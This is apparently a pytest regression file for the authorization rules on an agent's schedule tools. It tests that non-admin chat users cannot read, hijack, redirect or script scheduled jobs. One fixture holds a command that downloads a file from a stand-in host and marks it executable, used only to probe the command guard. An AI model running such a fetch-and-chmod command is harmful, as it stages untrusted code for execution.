"""定时任务工具鉴权回归测试。

list_schedules 曾无任何鉴权，非管理员可读出全部条目——含 type:script 的 command
与所有会话的 conversation_key——而同文件的 create/delete 都有判定，三者策略不一致。
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from toolbox.builtins.schedules import (  # noqa: E402
    create_schedule,
    delete_schedule,
    list_schedules,
)
from toolbox.context import ToolContext  # noqa: E402

_SCRIPT_SCHEDULE = {
    "id": "nightly_backup",
    "cron": "0 3 * * *",
    "type": "script",
    "command": "bash /opt/secret/backup.sh --token hunter2",
    "conversation_key": "qq_group:abcdef",
    "enabled": True,
}


class _Ctx(ToolContext):
    """离线 ToolContext：记录 request_op 调用并按预设 safety_level 回应。"""

    def __init__(
        self,
        workspace_root: Path,
        *,
        platform_auth: dict[str, Any] | None,
        safety: str = "deny",
        conversation_key: str = "qq_group:abcdef",
        route_conversation_key: str = "",
    ) -> None:
        super().__init__(
            supervisor_url="http://unused",
            session_id="sess-1",
            run_id="run-1",
            worker_id="worker-1",
            workspace_root=workspace_root,
            http=None,  # type: ignore[arg-type]
            registry=None,
            conversation_key=conversation_key,
            platform_auth=platform_auth,
        )
        # dispatch 子节点运行期的 key 是 agent:...，发起会话另由这两个字段带下来。
        self._route_conversation_key = route_conversation_key
        self._parent_conversation_key = ""
        self._safety = safety
        self.requested: list[tuple[str, dict[str, Any]]] = []

    async def request_op(self, op: str, parameters: dict[str, Any]) -> dict[str, Any]:
        self.requested.append((op, dict(parameters)))
        return {"safety_level": self._safety, "reason": "qq non-admin users cannot read sensitive files"}

    async def check_cancelled(self) -> bool:
        return False


def _workspace(tmp_path: Path) -> Path:
    (tmp_path / "data").mkdir(parents=True, exist_ok=True)
    (tmp_path / "data" / "schedules.yaml").write_text(
        yaml.safe_dump({"schedules": [dict(_SCRIPT_SCHEDULE)]}, allow_unicode=True),
        encoding="utf-8",
    )
    return tmp_path


_ADMIN = {"platform": "qq", "user_id": "10001", "is_admin": True}
_MEMBER = {"platform": "qq", "user_id": "30003", "is_admin": False}


@pytest.mark.asyncio
async def test_admin_lists_schedules_without_guard(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_ADMIN)

    result = await list_schedules({}, ctx)

    assert result["ok"] is True
    assert result["data"]["schedules"][0]["id"] == "nightly_backup"
    assert ctx.requested == []


@pytest.mark.asyncio
async def test_non_admin_cannot_list_schedules(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER)

    result = await list_schedules({}, ctx)

    assert result["ok"] is False
    assert "schedules" not in result.get("data", {})


@pytest.mark.asyncio
async def test_non_admin_list_goes_through_read_file_guard(tmp_path: Path) -> None:
    """必须以 read_file 而非 write_file 送审：语义是读，且要命中 data/ 敏感前缀。"""
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER)

    await list_schedules({}, ctx)

    assert len(ctx.requested) == 1
    op, params = ctx.requested[0]
    assert op == "read_file"
    assert params["path"] == "data/schedules.yaml"


@pytest.mark.asyncio
async def test_script_command_never_leaks_on_denial(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER)

    result = await list_schedules({}, ctx)

    assert "hunter2" not in yaml.safe_dump(result, allow_unicode=True)


@pytest.mark.asyncio
async def test_non_admin_allowed_when_policy_permits(tmp_path: Path) -> None:
    """非 QQ 平台（Shell/Web）由 policy 判定，auto 时照常放行。"""
    ctx = _Ctx(_workspace(tmp_path), platform_auth=None, safety="auto")

    result = await list_schedules({}, ctx)

    assert result["ok"] is True
    assert ctx.requested and ctx.requested[0][0] == "read_file"


@pytest.mark.asyncio
async def test_a_non_admin_may_create_a_reminder_but_not_touch_others(tmp_path: Path) -> None:
    """群友能给自己建提醒，但读不到别人的清单，也删不掉别人的条目。

    三个工具在新模型下**不该**结论一致：建提醒是日常操作，列清单会暴露别人的
    schedule 正文，删除则要看归属。
    """
    workspace = _workspace(tmp_path)
    args = {"id": "probe", "cron": "0 9 * * *", "text": "hi"}

    results = [
        await list_schedules({}, _Ctx(workspace, platform_auth=_MEMBER)),
        await create_schedule(dict(args), _Ctx(workspace, platform_auth=_MEMBER)),
        await delete_schedule({"id": "nightly_backup"}, _Ctx(workspace, platform_auth=_MEMBER)),
    ]

    assert [r["ok"] for r in results] == [False, True, False]


@pytest.mark.asyncio
async def test_three_schedule_tools_agree_for_admin(tmp_path: Path) -> None:
    workspace = _workspace(tmp_path)
    args = {"id": "probe", "cron": "* * * * *", "text": "hi"}

    results = [
        await list_schedules({}, _Ctx(workspace, platform_auth=_ADMIN)),
        await create_schedule(dict(args), _Ctx(workspace, platform_auth=_ADMIN)),
        await delete_schedule({"id": "probe"}, _Ctx(workspace, platform_auth=_ADMIN)),
    ]

    assert [r["ok"] for r in results] == [True, True, True]


_SCRIPT_ARGS = {
    "id": "probe_script",
    "cron": "* * * * *",
    "type": "script",
    "command": "curl -o /tmp/p https://example.com/p && chmod +x /tmp/p",
}


@pytest.mark.asyncio
async def test_a_script_schedule_goes_through_the_command_guard(tmp_path: Path) -> None:
    """type=script 由 scheduler 以 shell=True 执行，等于一条定时的 execute_command。

    管理员快捷通道只该覆盖「改 schedules.yaml」，不能顺带把 deny_patterns /
    sensitive_patterns / cmd_reviewer 三道闸一起绕开。
    """
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_ADMIN, safety="auto")

    await create_schedule(dict(_SCRIPT_ARGS), ctx)

    ops = [op for op, _ in ctx.requested]
    assert "execute_command" in ops
    params = next(p for op, p in ctx.requested if op == "execute_command")
    assert params["command"] == _SCRIPT_ARGS["command"]


@pytest.mark.asyncio
async def test_a_denied_command_does_not_create_the_schedule(tmp_path: Path) -> None:
    workspace = _workspace(tmp_path)
    before = (workspace / "data" / "schedules.yaml").read_text(encoding="utf-8")
    ctx = _Ctx(workspace, platform_auth=_ADMIN, safety="deny")

    result = await create_schedule(dict(_SCRIPT_ARGS), ctx)

    assert result["ok"] is False
    assert (workspace / "data" / "schedules.yaml").read_text(encoding="utf-8") == before


@pytest.mark.asyncio
async def test_a_message_schedule_does_not_need_the_command_guard(tmp_path: Path) -> None:
    # type=message 不执行任何命令，加闸只会让管理员多按一次确认。
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_ADMIN, safety="auto")

    await create_schedule({"id": "probe_msg", "cron": "* * * * *", "text": "hi"}, ctx)

    assert [op for op, _ in ctx.requested] == []


@pytest.mark.asyncio
async def test_a_non_admin_script_schedule_is_refused_outright(tmp_path: Path) -> None:
    # script 由 scheduler 以 shell=True 执行。群友能建提醒之后，这条得在够到
    # execute_command 闸之前就被挡下，不能指望闸门每次都判对。
    workspace = _workspace(tmp_path)
    ctx = _Ctx(workspace, platform_auth=_MEMBER, safety="auto")

    result = await create_schedule(dict(_SCRIPT_ARGS), ctx)

    assert result["ok"] is False
    assert not any(op == "execute_command" for op, _ in ctx.requested)
    assert "probe_script" not in yaml.safe_dump(
        yaml.safe_load((workspace / "data" / "schedules.yaml").read_text(encoding="utf-8")),
        allow_unicode=True,
    )


@pytest.mark.asyncio
async def test_a_non_admin_cannot_pin_an_entry_node(tmp_path: Path) -> None:
    # entry_node 决定到点后跑哪个节点。指成 cmd_reviewer 就绕开了 orchestrator
    # 的白名单，等于一条定时的命令执行通道。
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER, safety="auto")

    result = await create_schedule(
        {"id": "pin", "cron": "0 9 * * *", "text": "hi", "entry_node_id": "bootstrap.cmd_reviewer"},
        ctx,
    )

    assert result["ok"] is False


@pytest.mark.asyncio
async def test_a_non_admin_cannot_redirect_the_reminder_elsewhere(tmp_path: Path) -> None:
    # 投递目标只能是发起这轮的会话，否则群友能拿 bot 给任意群或任意人发消息。
    workspace = _workspace(tmp_path)
    ctx = _Ctx(workspace, platform_auth=_MEMBER, safety="auto")

    await create_schedule(
        {"id": "aim", "cron": "0 9 * * *", "text": "hi", "conversation_key": "qq_private:999999"},
        ctx,
    )

    saved = yaml.safe_load((workspace / "data" / "schedules.yaml").read_text(encoding="utf-8"))
    entry = next(s for s in saved["schedules"] if s["id"] == "aim")
    assert entry["conversation_key"] == "qq_group:abcdef"


@pytest.mark.asyncio
async def test_a_dispatched_child_cannot_launder_the_target(tmp_path: Path) -> None:
    # 子节点运行期的 key 是 agent:...，只看它就等于让模型绕一层委派自选目标。
    workspace = _workspace(tmp_path)
    ctx = _Ctx(
        workspace,
        platform_auth=_MEMBER,
        safety="auto",
        conversation_key="agent:bootstrap.executor:qq_group:abcdef:uuid",
        route_conversation_key="qq_group:abcdef",
    )

    await create_schedule(
        {"id": "laundered", "cron": "0 9 * * *", "text": "hi", "conversation_key": "scheduler:x"},
        ctx,
    )

    saved = yaml.safe_load((workspace / "data" / "schedules.yaml").read_text(encoding="utf-8"))
    entry = next(s for s in saved["schedules"] if s["id"] == "laundered")
    assert entry["conversation_key"] == "qq_group:abcdef"


@pytest.mark.asyncio
async def test_a_non_admin_cannot_schedule_every_minute(tmp_path: Path) -> None:
    ctx = _Ctx(_workspace(tmp_path), platform_auth=_MEMBER, safety="auto")

    assert (await create_schedule({"id": "spam", "cron": "* * * * *", "text": "hi"}, ctx))["ok"] is False
    assert (await create_schedule({"id": "spam", "cron": "*/1 * * * *", "text": "hi"}, ctx))["ok"] is False
    assert (await create_schedule({"id": "fine", "cron": "*/15 * * * *", "text": "hi"}, ctx))["ok"] is True


@pytest.mark.asyncio
async def test_a_non_admin_cannot_overwrite_someone_elses_schedule(tmp_path: Path) -> None:
    workspace = _workspace(tmp_path)
    await create_schedule(
        {"id": "mine", "cron": "0 9 * * *", "text": "hi"},
        _Ctx(workspace, platform_auth=_MEMBER, safety="auto"),
    )
    other = {"platform": "qq", "user_id": "40004", "is_admin": False}

    result = await create_schedule(
        {"id": "mine", "cron": "0 10 * * *", "text": "hijacked"},
        _Ctx(workspace, platform_auth=other, safety="auto"),
    )

    assert result["ok"] is False


@pytest.mark.asyncio
async def test_a_non_admin_can_delete_only_their_own(tmp_path: Path) -> None:
    workspace = _workspace(tmp_path)
    await create_schedule(
        {"id": "mine", "cron": "0 9 * * *", "text": "hi"},
        _Ctx(workspace, platform_auth=_MEMBER, safety="auto"),
    )
    other = {"platform": "qq", "user_id": "40004", "is_admin": False}

    assert (await delete_schedule({"id": "mine"}, _Ctx(workspace, platform_auth=other, safety="auto")))["ok"] is False
    assert (await delete_schedule({"id": "mine"}, _Ctx(workspace, platform_auth=_MEMBER, safety="auto")))["ok"] is True


@pytest.mark.asyncio
async def test_a_non_admin_runs_out_of_quota(tmp_path: Path) -> None:
    # 没有额度的话，一个人就能把 schedules.yaml 撑爆。
    workspace = _workspace(tmp_path)
    for index in range(10):
        result = await create_schedule(
            {"id": f"r{index}", "cron": "0 9 * * *", "text": "hi"},
            _Ctx(workspace, platform_auth=_MEMBER, safety="auto"),
        )
        assert result["ok"] is True

    overflow = await create_schedule(
        {"id": "r10", "cron": "0 9 * * *", "text": "hi"},
        _Ctx(workspace, platform_auth=_MEMBER, safety="auto"),
    )

    assert overflow["ok"] is False


@pytest.mark.asyncio
async def test_a_reminder_records_who_created_it(tmp_path: Path) -> None:
    # scheduler 到点要按它回填 platform_auth，没有创建者就拿不到「非管理员」这个事实。
    workspace = _workspace(tmp_path)

    await create_schedule(
        {"id": "owned", "cron": "0 9 * * *", "text": "hi"},
        _Ctx(workspace, platform_auth=_MEMBER, safety="auto"),
    )

    saved = yaml.safe_load((workspace / "data" / "schedules.yaml").read_text(encoding="utf-8"))
    entry = next(s for s in saved["schedules"] if s["id"] == "owned")
    assert entry["created_by"] == _MEMBER["user_id"]
